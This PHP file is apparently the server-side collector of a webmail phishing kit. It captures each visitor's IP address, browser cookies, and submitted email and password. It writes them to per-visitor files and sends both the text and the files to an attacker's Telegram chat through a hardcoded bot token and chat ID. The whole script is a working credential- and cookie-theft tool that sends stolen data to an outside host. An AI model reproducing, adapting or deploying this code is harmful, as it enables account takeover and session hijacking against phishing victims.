<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

// Telegram bot information
$telegramBotToken = '6993164522:AAES-MrFxo_PlFNQQweOQLkgyWr8GXDnaaw'; // Replace with your Telegram Bot Token
$telegramChatID = '2074391753'; // Replace with your Chat ID

// Define the path to the cookies file
$cookiesFile = 'cookies.ckz';

// Function to send a message to Telegram
function sendTelegramMessage($message) {
    global $telegramBotToken, $telegramChatID;

    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    $payload = [
        'chat_id' => $telegramChatID,
        'text' => $message
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// Function to send a file to Telegram
function sendTelegramFile($filePath) {
    global $telegramBotToken, $telegramChatID;

    $url = "https://api.telegram.org/bot$telegramBotToken/sendDocument";

    $postFields = [
        'chat_id' => $telegramChatID,
        'document' => new CURLFile(realpath($filePath))
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// Function to handle each user's cookies and credentials separately
function handleUserData() {
    global $cookiesFile;

    // Retrieve visitor's IP address and cookies
    $ips = getenv("REMOTE_ADDR");
    $cookies = isset($_SERVER['HTTP_COOKIE']) ? $_SERVER['HTTP_COOKIE'] : 'No cookies found';

    // Create a unique file for each user
    $userFile = 'cookies_' . uniqid() . '.ckz';

    // Save cookies to a unique file for each user
    file_put_contents($userFile, "IP: $ips\nCookies: $cookies\n", FILE_APPEND);

    // Send the unique cookies file to Telegram
    sendTelegramFile($userFile);

    if (!empty($_POST)) {
        $email = $_POST['userid'] ?? 'No email';
        $password = $_POST['userpwd'] ?? 'No password';

        $message = "------WEBMAIL-------\n";
        $message .= "Online ID            : " . $email . "\n";
        $message .= "Password             : " . $password . "\n";
        $message .= "IP                   : " . $ips . "\n";
        $message .= "cookies              : " . $cookies . "\n";
		$message .= "Login Successful     : YES\n";

        // Send login information to Telegram
        sendTelegramMessage($message);

        // Append the login information to the unique file
        file_put_contents($userFile, "Email: $email\nPassword: $password\n", FILE_APPEND);

        // Send the updated unique file to Telegram
        sendTelegramFile($userFile);
    }
}

// Call the function to handle user data
handleUserData();
?>